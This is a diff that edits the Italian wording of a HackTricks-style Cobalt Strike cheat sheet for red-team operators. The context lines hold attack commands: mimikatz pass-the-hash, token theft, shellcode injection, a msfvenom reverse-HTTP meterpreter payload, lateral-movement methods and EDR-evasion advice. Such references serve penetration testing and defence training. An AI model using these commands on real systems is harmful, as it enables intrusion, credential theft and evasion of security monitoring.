@@ -1,6 +1,6 @@
 # Cobalt Strike
 
-{{#include /banners/hacktricks-training.md}}
+{{#include ../banners/hacktricks-training.md}}
 
 ### Listeners
 
@@ -43,9 +43,9 @@ execute-assembly </path/to/executable.exe>
 # Nota che per caricare assembly più grandi di 1MB, la proprietà 'tasks_max_size' del profilo malleable deve essere modificata.
 
 # Screenshots
-printscreen    # Scatta un singolo screenshot tramite il metodo PrintScr
-screenshot     # Scatta un singolo screenshot
-screenwatch    # Scatta screenshot periodici del desktop
+printscreen    # Fai uno screenshot singolo tramite il metodo PrintScr
+screenshot     # Fai uno screenshot singolo
+screenwatch    # Fai screenshot periodici del desktop
 ## Vai su View -> Screenshots per vederli
 
 # keylogger
@@ -91,7 +91,7 @@ spawnas [domain\username] [password] [listener] #Fallo da una directory con acce
 
 ## Inietta nel processo
 inject [pid] [x64|x86] [listener]
-## Da un punto di vista OpSec: Non eseguire iniezioni cross-platform a meno che non sia davvero necessario (es. x86 -> x64 o x64 -> x86).
+## Dal punto di vista dell'OpSec: Non eseguire iniezioni cross-platform a meno che non sia davvero necessario (ad es. x86 -> x64 o x64 -> x86).
 
 ## Pass the hash
 ## Questo processo di modifica richiede la patching della memoria LSASS che è un'azione ad alto rischio, richiede privilegi di amministratore locale e non è molto praticabile se il Protected Process Light (PPL) è abilitato.
@@ -101,7 +101,7 @@ pth [DOMAIN\user] [NTLM hash]
 ## Pass the hash tramite mimikatz
 mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
 ## Senza /run, mimikatz genera un cmd.exe, se stai eseguendo come utente con Desktop, vedrà la shell (se stai eseguendo come SYSTEM sei a posto)
-steal_token <pid> #Ruba token dal processo creato da mimikatz
+steal_token <pid> #Ruba il token dal processo creato da mimikatz
 
 ## Pass the ticket
 ## Richiedi un ticket
@@ -137,7 +137,7 @@ jump [method] [target] [listener]
 ## Metodi:
 ## psexec                    x86   Usa un servizio per eseguire un artefatto Service EXE
 ## psexec64                  x64   Usa un servizio per eseguire un artefatto Service EXE
-## psexec_psh                x86   Usa un servizio per eseguire un one-liner PowerShell
+## psexec_psh                x86   Usa un servizio per eseguire una riga di comando PowerShell
 ## winrm                     x86   Esegui uno script PowerShell tramite WinRM
 ## winrm64                   x64   Esegui uno script PowerShell tramite WinRM
 ## wmi_msbuild               x64   movimento laterale wmi con attività inline c# msbuild (oppsec)
@@ -173,7 +173,7 @@ msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw 
 
 ## Copia il file bin sul host cobalt strike
 ps
-shinject <pid> x64 C:\Payloads\msf.bin #Inietta shellcode metasploit in un processo x64
+shinject <pid> x64 C:\Payloads\msf.bin #Inietta il codice shell di metasploit in un processo x64
 
 # Pass metasploit session to cobalt strike
 ## Genera shellcode Beacon stageless, vai su Attacks > Packages > Windows Executable (S), seleziona il listener desiderato, seleziona Raw come tipo di output e seleziona Usa payload x64.
@@ -191,7 +191,7 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Execute-Assembly
 
-Il **`execute-assembly`** utilizza un **processo sacrificabile** usando l'iniezione di processo remoto per eseguire il programma indicato. Questo è molto rumoroso poiché per iniettare all'interno di un processo vengono utilizzate alcune API Win che ogni EDR sta controllando. Tuttavia, ci sono alcuni strumenti personalizzati che possono essere utilizzati per caricare qualcosa nello stesso processo:
+Il **`execute-assembly`** utilizza un **processo sacrificabile** utilizzando l'iniezione di processo remoto per eseguire il programma indicato. Questo è molto rumoroso poiché per iniettare all'interno di un processo vengono utilizzate alcune API Win che ogni EDR sta controllando. Tuttavia, ci sono alcuni strumenti personalizzati che possono essere utilizzati per caricare qualcosa nello stesso processo:
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
@@ -207,7 +207,7 @@ Puoi controllare eventi come `Seatbelt.exe LogonEvents ExplicitLogonEvents Power
 - Security EID 4624 - Controlla tutti i logon interattivi per conoscere le abituali ore di lavoro.
 - System EID 12,13 - Controlla la frequenza di spegnimento/accensione/sospensione.
 - Security EID 4624/4625 - Controlla i tentativi NTLM validi/invalidi in entrata.
-- Security EID 4648 - Questo evento viene creato quando vengono utilizzate credenziali in chiaro per effettuare l'accesso. Se un processo lo ha generato, il binario potrebbe avere le credenziali in chiaro in un file di configurazione o all'interno del codice.
+- Security EID 4648 - Questo evento viene creato quando vengono utilizzate credenziali in chiaro per accedere. Se un processo lo ha generato, il binario potrebbe avere le credenziali in chiaro in un file di configurazione o all'interno del codice.
 
 Quando usi `jump` da cobalt strike, è meglio usare il metodo `wmi_msbuild` per far sembrare il nuovo processo più legittimo.
 
@@ -274,13 +274,13 @@ Quando si inietta codice in un processo, questo è solitamente molto rumoroso, q
 
 Quando si genera un nuovo processo è importante **mantenere una regolare relazione genitore-figlio** tra i processi per evitare il rilevamento. Se svchost.exec sta eseguendo iexplorer.exe sembrerà sospetto, poiché svchost.exe non è un genitore di iexplorer.exe in un normale ambiente Windows.
 
-Quando un nuovo beacon viene generato in Cobalt Strike, per impostazione predefinita viene creato un processo utilizzando **`rundll32.exe`** per eseguire il nuovo listener. Questo non è molto furtivo e può essere facilmente rilevato dagli EDR. Inoltre, `rundll32.exe` viene eseguito senza argomenti, rendendolo ancora più sospetto.
+Quando un nuovo beacon viene generato in Cobalt Strike, per impostazione predefinita viene creato un processo utilizzando **`rundll32.exe`** per eseguire il nuovo listener. Questo non è molto furtivo e può essere facilmente rilevato dagli EDR. Inoltre, `rundll32.exe` viene eseguito senza argomenti rendendolo ancora più sospetto.
 
 Con il seguente comando Cobalt Strike, puoi specificare un processo diverso per generare il nuovo beacon, rendendolo meno rilevabile:
 ```bash
 spawnto x86 svchost.exe
 ```
-Puoi anche modificare questa impostazione **`spawnto_x86` e `spawnto_x64`** in un profilo.
+Puoi anche cambiare questa impostazione **`spawnto_x86` e `spawnto_x64`** in un profilo.
 
 ### Proxying attackers traffic
 
@@ -364,4 +364,4 @@ pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
 
 
-{{#include /banners/hacktricks-training.md}}
+{{#include ../banners/hacktricks-training.md}}
